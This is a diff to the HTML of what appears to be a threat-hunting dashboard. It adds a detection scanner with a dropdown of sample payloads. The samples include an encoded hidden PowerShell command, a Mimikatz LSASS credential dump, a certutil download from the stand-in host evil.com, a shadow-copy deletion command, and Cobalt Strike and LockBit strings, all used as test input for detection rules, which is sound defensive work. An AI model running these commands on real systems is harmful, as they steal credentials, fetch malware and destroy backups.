@@ -810,18 +810,40 @@
                     <div class="summary-grid">
                         <div class="summary-card"><span class="card-label">SIGMA RULES</span><div class="card-value" id="suite-hunt-sigma-count">8</div><span class="card-sub">Log Detection Rules</span></div>
                         <div class="summary-card"><span class="card-label">YARA SIGNATURES</span><div class="card-value" id="suite-hunt-yara-count">5</div><span class="card-sub">Memory & Binary Sigs</span></div>
-                        <div class="summary-card"><span class="card-label">THREAT HITS</span><div class="card-value" id="suite-hunt-hits-count" style="color:#f85149;">2</div><span class="card-sub">Correlated Matches</span></div>
+                        <div class="summary-card"><span class="card-label">THREAT HITS</span><div class="card-value" id="suite-hunt-hits-count" style="color:#f85149;">0</div><span class="card-sub">Correlated Matches</span></div>
                     </div>
                     <div class="panel-box">
                         <div class="panel-header">Interactive Threat Hunt Scanner</div>
-                        <div style="padding:16px;display:flex;gap:10px;">
-                            <input type="text" id="suite-hunt-input" class="filter-input" style="flex:1;" placeholder="Paste command line, payload, or process memory string to scan...">
-                            <button id="btn-suite-hunt-scan" class="btn btn-primary">Scan with SIGMA & YARA</button>
+                        <div style="padding:16px;display:flex;flex-direction:column;gap:10px;">
+                            <div style="display:flex;gap:10px;">
+                                <select id="suite-hunt-sample-select" class="filter-input" style="width:260px;">
+                                    <option value="">-- Quick Test Payloads --</option>
+                                    <option value="powershell.exe -NoP -NonI -W Hidden -Enc aWYoMTEpew==">1. Encoded PowerShell Payload (SIGMA-001)</option>
+                                    <option value="sekurlsa::logonpasswords procdump.exe -ma lsass.exe">2. Mimikatz LSASS Dump (SIGMA-002)</option>
+                                    <option value="certutil.exe -urlcache -split -f http://evil.com/malware.exe">3. Certutil Download Abuse (SIGMA-003)</option>
+                                    <option value="vssadmin.exe delete shadows /all /quiet">4. Ransomware VSS Deletion (SIGMA-008)</option>
+                                    <option value="ReflectiveLoader BeaconGetSpawn 4d5a900003000000">5. Cobalt Strike Reflective Loader (YARA-001)</option>
+                                    <option value="README_FOR_DECRYPT.txt YOUR_FILES_ARE_ENCRYPTED .lockbit">6. LockBit Ransomware Artifacts (YARA-003)</option>
+                                </select>
+                                <input type="text" id="suite-hunt-input" class="filter-input" style="flex:1;" placeholder="Paste command line, payload, or memory string to scan...">
+                                <button id="btn-suite-hunt-scan" class="btn btn-primary">Scan with SIGMA & YARA</button>
+                            </div>
+                            <pre id="suite-hunt-output" class="terminal-box" style="margin-top:6px;min-height:70px;max-height:180px;">[+] Interactive Threat Hunt Engine ready. Select a sample payload or enter custom text above to evaluate.</pre>
                         </div>
                     </div>
                     <div class="panel-box">
-                        <div class="panel-header-flex"><span>Correlated Threat Matches</span></div>
+                        <div class="panel-header-flex"><span>Correlated Threat Detections & Scan Hits</span></div>
                         <div id="suite-hunt-hits-container" style="padding:12px;"></div>
+                    </div>
+                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;">
+                        <div class="panel-box">
+                            <div class="panel-header-flex"><span>Active SIGMA Detection Rules</span></div>
+                            <div id="suite-hunt-sigma-container" style="padding:12px;max-height:400px;overflow-y:auto;"></div>
+                        </div>
+                        <div class="panel-box">
+                            <div class="panel-header-flex"><span>Active YARA Signature Rules</span></div>
+                            <div id="suite-hunt-yara-container" style="padding:12px;max-height:400px;overflow-y:auto;"></div>
+                        </div>
                     </div>
                 </section>
 
